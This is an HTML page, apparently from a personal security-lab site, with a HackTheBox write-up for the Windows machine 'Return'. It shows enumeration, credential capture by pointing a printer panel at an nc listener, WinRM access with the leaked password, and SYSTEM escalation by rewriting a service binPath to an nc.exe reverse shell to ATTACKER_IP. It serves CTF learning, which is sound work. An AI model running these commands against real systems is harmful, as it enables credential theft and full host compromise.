@@ -1,0 +1,224 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Return</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>Return (HTB – Easy)</h1>
+
+<p>
+Return is a Windows domain machine exposing SMB, WinRM, and a printer administration panel.  
+The printer panel leaks valid domain credentials when forced to authenticate to an attacker-controlled listener.  
+Privilege escalation is achieved through the <code>Server Operators</code> group by modifying the <code>binPath</code> of a Windows service.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: return.htb  
+<br>Initial vector: Printer panel credential leak  
+<br>Privilege escalation: Service modification via Server Operators  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Nmap:</p>
+<pre>
+53/tcp   domain
+80/tcp   http (IIS)
+88/tcp   kerberos
+135/tcp  msrpc
+139/tcp  netbios-ssn
+389/tcp  ldap
+445/tcp  smb
+5985/tcp winrm
+10000/tcp webmin
+</pre>
+
+<p>
+Port 80 hosts the “HTB Printer Admin Panel”.  
+SMB enumeration reveals no anonymous shares:
+</p>
+
+<pre>
+$ crackmapexec smb 10.129.65.16
+$ smbclient -L 10.129.65.16 -N
+$ smbmap -H 10.129.65.16
+</pre>
+
+<h2>Foothold – Printer Panel Credential Leak</h2>
+
+<p>
+The printer panel allows configuring a network printer.  
+If we point the printer to our attacker machine, it attempts authentication and leaks credentials.
+</p>
+
+<p>Start a listener on the attacker:</p>
+<pre>
+$ nc -nlvp 389
+</pre>
+
+<p>
+Trigger the printer connection from the web panel.  
+Captured credentials:
+</p>
+
+<pre>
+svc-printer : 1edFg43012!!
+</pre>
+
+<p>
+Validate with WinRM:</p>
+<pre>
+$ crackmapexec winrm 10.129.65.16 -u svc-printer -p '1edFg43012!!'
+-> Pwn3d!
+</pre>
+
+<p>Obtain a shell:</p>
+<pre>
+$ evil-winrm -i 10.129.65.16 -u svc-printer -p '1edFg43012!!'
+</pre>
+
+<h2>Privilege Escalation</h2>
+
+<p>
+Check privileges:
+</p>
+
+<pre>
+whoami /priv
+net user svc-printer
+</pre>
+
+<p>
+The account is a member of:
+</p>
+
+<pre>
+Remote Management Users
+Server Operators
+</pre>
+
+<p>
+Members of <code>Server Operators</code> can modify service configurations, including <code>binPath</code>, which allows arbitrary command execution as SYSTEM.
+</p>
+
+<h3>Reverse Shell via Service Modification</h3>
+
+<p>Upload <code>nc.exe</code> to the target:</p>
+<pre>
+PS> upload nc.exe C:\Windows\Temp\nc.exe
+</pre>
+
+<p>
+Find a writable service (trial and error).  
+Modify its <code>binPath</code>:
+</p>
+
+<pre>
+sc.exe config <serviceName> binPath= "C:\Windows\Temp\nc.exe -e cmd.exe ATTACKER_IP 4444"
+</pre>
+
+<p>Restart the service:</p>
+<pre>
+sc.exe stop <serviceName>
+sc.exe start <serviceName>
+</pre>
+
+<p>
+Listener on attacker:
+</p>
+
+<pre>
+$ nc -nlvp 4444
+-> SYSTEM shell
+</pre>
+
+<h2>Conclusion</h2>
+<p>
+Return demonstrates a classic Windows misconfiguration: a printer panel leaking domain credentials, combined with
+the powerful <code>Server Operators</code> group.  
+By modifying a service’s <code>binPath</code>, full SYSTEM compromise is achieved.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
